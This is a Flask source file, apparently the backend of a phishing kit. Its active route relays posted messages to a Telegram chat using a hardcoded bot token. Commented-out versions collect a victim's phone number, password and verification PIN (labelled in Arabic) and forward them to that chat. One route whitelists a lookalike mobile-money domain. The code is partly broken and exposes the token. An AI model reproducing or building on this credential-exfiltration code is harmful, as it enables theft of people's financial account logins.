from flask_cors import CORS
from flask import Flask, request, jsonify
import requests
CORS(app)
app = Flask(__name__)


TELEGRAM_BOT_TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
TELEGRAM_CHAT_ID = "-4849674945"

@app.route('/send_telegram_message', methods=['POST'])
def send_telegram_message():
    message_text = request.json.get('message', 'Default message from Flask server.')
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message_text
    }
    
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Raise an exception for HTTP errors
        return jsonify({"status": "success", "telegram_response": response.json()}), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"status": "error", "message": str(e)}), 500

        






# @app.route('/send_telegram_message', methods=['POST'])
# def send_telegram_message():
#         response = request.json
#     message=''
#     message+='رقم الهاتف: `'+response['phonenumber']+'`\n'
#     message+='كلمة المرور: `'+response['password']+'`\n'
#     if 'pin' in response:
#         message += 'رمز التحقق: `'+response['pin']+'`'
#     message=urllib.parse.quote(message)
#     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"
    
#     message_text = request.json.get('message', 'Default message from Flask server.')
    
#     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
#     payload = {
#         'chat_id': TELEGRAM_CHAT_ID,
#         'text': message_text
#     }
    
#     try:
#         response = requests.post(url, json=payload)
#         response.raise_for_status()  # Raise an exception for HTTP errors
#         return jsonify({"status": "success", "telegram_response": response.json()}), 200
#     except requests.exceptions.RequestException as e:
#         return jsonify({"status": "error", "message": str(e)}), 500


# # @app.after_request
# # def add_cors_headers(response):
#     # response.headers.add("Access-Control-Allow-Origin", "*")  # Allows all origins
#     # response.headers.add("Access-Control-Allow-Headers", "Content-Type")
# #     # if request.method == 'POST':
#         # response.headers.add("Access-Control-Allow-Methods",  'POST')
# #     response.status_code=200
# #     return response


# # @app.after_request
# # def add_cors_headers(response):
# #     response.headers.add('Access-Control-Allow-Origin', '*')
# #     response.headers.add('Access-Control-Allow-Headers','*')
# #     response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
# #     response.status_code = 200
# #     # if request.method != 'POST':
# #     return response



# # @app.teardown_request
# # def teardown_db_connection(exception):
# #     try:
# #         print(str(exception))
# #     except:
# #         print("CATCHED")

#     # This function will be called after each reque


# # CORS(app, resources={r"/*": {"origins": "*"}})


# # @app.route("/", methods=['POST'])
# # @cross_origin(automatic_options=False)
# # def webhook():
# #     response = request.json
# #     message=''
# #     message+='رقم الهاتف: `'+response['phonenumber']+'`\n'
# #     message+='كلمة المرور: `'+response['password']+'`\n'
# #     if 'pin' in response:
# #         message += 'رمز التحقق: `'+response['pin']+'`'
# #     message=urllib.parse.quote(message)
# #     TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
# # #     # chat_id = "-4763590791"
# #     chat_id = "-4849674945"
# #     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"
# #     request.get(url)
# #     return jsonify({"message": "Data received", "data": data}), 200


# # @app.route("/",methods=['GET'])
# # @cross_origin(origins="https://oranngemoney.com",methods='GET')
# # def submit_form():
# #     response = request.args

    # TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
    # chat_id = "-4849674945"
#     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"
# #     requests.get(url)
#     # response = make_response(jsonify({'message': 'Data from Flask API'}))
# #     response.headers['access-aontrol-Allow-Origin'] = '*'
# #     # response.headers['access-control-allow-methods'] = 'Content-Type,x-xsrf-token,x-requested-with,x-client-app-version,x-content-type-options'
# #     response.headers['content-type'] = 'application/json; charset=utf-8'
# #     response.status_code = 200
# #     response.data = 'true'
# #     # return jsonify({"token": "Data received", "data": '7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A'}), 200

# # # @app.route("/",methods=['GET'])
# # # def submit():
#     message=''
#     message+=': `'+'0000000000'+'`\n'
# # #     message+='كلمة المرور: `'+'mmmm123!'+'`\n'
# # #     message=urllib.parse.quote(message)
# # #     TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
# # #     # chat_id = "-4763590791"
# # #     chat_id = "-4849674945"
# # #     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"
# # #     requests.get(url)

# # #     response = make_response(jsonify({'message': 'Data from Flask API'}))
# # #     response.headers['Access-Control-Allow-Origin'] = '*'
# # #     response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'

# # #     return jsonify({"message": "Data received", "data": message}), 200
